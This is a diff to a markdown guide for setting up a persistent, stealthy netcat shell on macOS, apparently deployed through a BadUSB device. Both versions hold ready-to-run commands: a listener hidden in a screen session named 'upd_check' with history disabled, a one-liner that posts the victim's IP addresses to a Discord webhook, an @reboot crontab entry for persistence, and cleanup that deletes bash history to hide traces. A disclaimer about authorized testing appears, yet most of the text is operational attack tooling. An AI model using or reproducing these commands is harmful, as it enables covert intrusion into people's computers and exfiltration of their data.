@@ -1,8 +1,10 @@
 # **Mac Endless Reverse Shell**
 
-### **This guide is for educational purposes or authorized security testing only. Unauthorized access to computer systems is illegal and unethical.**
+### **Introduction**
 
-Interactive reverse shell on MacOS systems, leveraging **`nc`** (netcat). This approach is designed for stealth and efficiency, avoiding reliance on Python or any other non-standard tools on the target machine. Follow these steps carefully to maintain control over the target system discreetly.
+This guide provides step-by-step instructions for setting up an interactive reverse shell on MacOS systems using **`nc`** (netcat). It is intended for educational purposes or authorized security testing only. Unauthorized access to computer systems is illegal and unethical. Please ensure you have proper authorization before attempting any actions described in this guide.
+
+For additional commands and data on reverse shells, refer to the [HackTricks documentation](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys#full-tty).
 
 ## **Setup Instructions**
 
@@ -12,17 +14,28 @@ Interactive reverse shell on MacOS systems, leveraging **`nc`** (netcat). This a
 
 **Objective:** Start a reverse shell listener on the target machine as a background process using **`screen`**.
 
-Not used in the BadUSB script but good to have.
+`screen -dmS upd_check bash -c 'unset HISTFILE; set +o history; trap "pkill -P \$\$" SIGINT SIGTERM; while true; do rm -f /tmp/f; mkfifo /tmp/f; nc -l 9123 < /tmp/f | bash -i > /tmp/f 2>&1 & nc_pid=$!; (sleep 300 && kill -9 $nc_pid 2>/dev/null) & wait $nc_pid; done'`
 
-- **Initial Command:** This sets up a continuous loop that listens for incoming connections on port 9123, handling signals to clean up and exit gracefully if needed.
+**Description**:
 
-`screen -dmS upd_check bash -ic "unset HISTFILE; set +o history; trap 'rm -f /tmp/f; screen -S background_process -X quit; kill -SIGINT $$' EXIT; while true; do rm /tmp/f || true; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 9123 >/tmp/f; [ -f /tmp/terminate ] && break || true; sleep 1; done"` 
+- **`screen -dmS upd_check`**: Starts a detached screen session named "upd_check" to run the following command.
+- **`bash -c '...'`**: Launches a Bash shell and executes the provided command within it.
+- **`unset HISTFILE`**: Prevents Bash from saving command history to a file.
+- **`set +o history`**: Disables command history for the current shell session.
+- **`trap "pkill -P \$\$" SIGINT SIGTERM`**: Sets up a trap to kill any child processes spawned by the command upon receiving SIGINT or SIGTERM signals (e.g., Ctrl+C).
+- **`while true; do ... done`**: Creates an infinite loop to continuously execute the following commands.
+- **`rm -f /tmp/f`**: Removes any existing FIFO file named "/tmp/f".
+- **`mkfifo /tmp/f`**: Creates a new FIFO (named pipe) file named "/tmp/f" for communication.
+- **`nc -l 9123 < /tmp/f | bash -i > /tmp/f 2>&1 &`**: Sets up a netcat listener on port 9123, redirecting input/output to the FIFO file, and starts a Bash shell with interactive mode (-i).
+- **`nc_pid=$!`**: Stores the process ID (PID) of the netcat listener.
+- **`(sleep 300 && kill -9 $nc_pid 2>/dev/null) &`**: Initiates a background process to sleep for 300 seconds (5 minutes) and then forcibly terminates the netcat listener process to trigger automatic reconnection.
+- **`wait $nc_pid`**: Pauses execution until the netcat listener process terminates.
 
-The BadUSB Payload:
+Then, send the external and internal IP addresses of the machine to a Discord channel. Replace **`YOUR_DISCORD_CHANNEL_TOKEN`** with your token inside the Ducky Script:
+`external_ip=$(curl -s [ifconfig.me](http://ifconfig.me/)); internal_ips=$(ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1' | sed 's/inet //' | paste -sd "," -); json_payload="{\"content\": \"From Endless Reverse Shell BadUSB:\\nExternal IP: $external_ip\\nInternal IP(s): $(echo $internal_ips | sed 's/,/, /g')\\n----------------------------------------\"}"; curl -X POST -H "Content-Type: application/json" -d "$json_payload" "YOUR_DISCORD_CHANNEL_TOKEN" && unset external_ip internal_ips`
 
-- **Enhanced Command:** Improves upon the initial setup by attempting to re-establish the reverse shell every 5 minutes, ensuring connectivity even if the session is disrupted.
-
-`screen -dmS upd_check bash -ic 'unset HISTFILE; set +o history; trap "rm -f /tmp/f; screen -S background_process -X quit; killall nc 2>/dev/null; kill -SIGINT $$" EXIT; while true; do rm /tmp/f || true; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 9123 >/tmp/f & sleep 300; pkill -f "nc -l 9123" 2>/dev/null && ps aux | awk "/bash -i/ && !/awk/ {print \$2}" | xargs kill -9; if [ -f /tmp/terminate ]; then break; fi; done'`
+Not part of the Ducky Payload. For increased persistence, set the command as a crontab job (TCC permission is needed):
+`@reboot /bin/bash -c 'unset HISTFILE; set +o history; trap "pkill -P \$\$" SIGINT SIGTERM; while true; do rm -f /tmp/f; mkfifo /tmp/f; (nc -l 9123 < /tmp/f | bash -i > /tmp/f 2>&1 || true) & nc_pid=$!; (sleep 300 && kill -9 $nc_pid 2>/dev/null || true) & wait $nc_pid; done'`
 
 ---
 
@@ -50,13 +63,14 @@ The BadUSB Payload:
 
 - **Standard Shell Environment:** Enhances the shell for command execution without leaving history.
     
-    `script -q /dev/null bash` and then `unset HISTFILE; set +o history && export PS1='\u@\h:\w\$'`
+    `script -q /dev/null bash
+    unset HISTFILE; set +o history && export PS1='\u@\h:\w\$'`
     
 - **Executing Privileged Commands:** Executes commands as **`sudo`** without logging.
     
     `unset HISTFILE; set +o history && echo "password" | sudo -S whoami` 
     
-- **Root Access:** After Switching to root execute this for not logging the commands.
+- **Root Access:** Switch to root without command logging.
     
     `unset HISTFILE`
     
@@ -67,7 +81,7 @@ The BadUSB Payload:
 
 **Objective:** Remove traces of the reverse shell session and terminate gracefully.
 
-- **Command for cleanup processes that are related to reverse shell:**
+- **Command for cleanup processes that related to reverse shell:**
 
 `nohup bash -c 'screen -S upd_check -X quit; sleep 3; screen -wipe; pkill -f "nc -l 9123"; ps aux | grep "[b]ash -i" | grep -v grep | awk "{print \$2}" | xargs -r kill -9; rm -f /tmp/f; rm -f ~/.bash_history' > /dev/null 2>&1 &`
 
@@ -83,12 +97,6 @@ The BadUSB Payload:
 
 ### **Important Note:**
 
-When using the **`script`** command to enhance the shell environment, there's a risk of leaving the reverse shell process in a suspended state if the session exits unexpectedly. This can occur because the **`script`** command initiates a new shell session for logging purposes, and if this session is not properly terminated (for instance, due to a network disconnection or closing the terminal without exiting the **`script`** session), the underlying process may continue to run without the ability to reconnect. To mitigate this risk and ensure the ability to reconnect, it's crucial to exit the **`script`** session using the **`exit`** command before ending your reverse shell session. This ensures that all processes are terminated properly and the shell is left in a state that allows for future connections.
+The procedure incorporates an automatic re-establishment mechanism for the reverse shell connection every 5 minutes. This feature proves particularly valuable in scenarios where the reverse shell may be disrupted due to network instability or accidental closure of the initial connection. By utilizing a loop that periodically terminates the existing **`nc`** listener and initiates a new one, the command ensures that the attacker can regain access to the target machine without the need to redeploy the payload. This auto-reconnect functionality enhances the resilience of the reverse shell to disconnections and reinforces its persistence on the target machine, guaranteeing that temporary disruptions do not permanently sever the attacker's access.
 
-For the clarification on the **`screen`** command and how the enhanced command improves reliability:
-
-### **Clarification on `screen` Command:**
-
-The enhanced **`screen`** command offers a significant improvement over the initial setup by incorporating a mechanism to automatically attempt re-establishment of the reverse shell connection every 5 minutes. This approach is particularly useful in scenarios where the reverse shell might be disrupted due to network instability or if the initial connection is accidentally closed. By using a loop that periodically kills the existing **`nc`** (netcat) listener and starts a new one, the command ensures that the attacker can regain access to the target machine without needing to re-deploy the payload. This auto-reconnect feature makes the reverse shell more resilient to disconnections and enhances its persistence on the target machine, ensuring that temporary disruptions do not permanently sever the attacker's access.
-
-### ***This procedure is designed for operational discretion and effectiveness. Ensure you have authorized access to the system before attempting this setup.***
+### ***This procedure prioritizes operational discretion and effectiveness. Ensure you possess authorized access to the system before proceeding with this setup.***
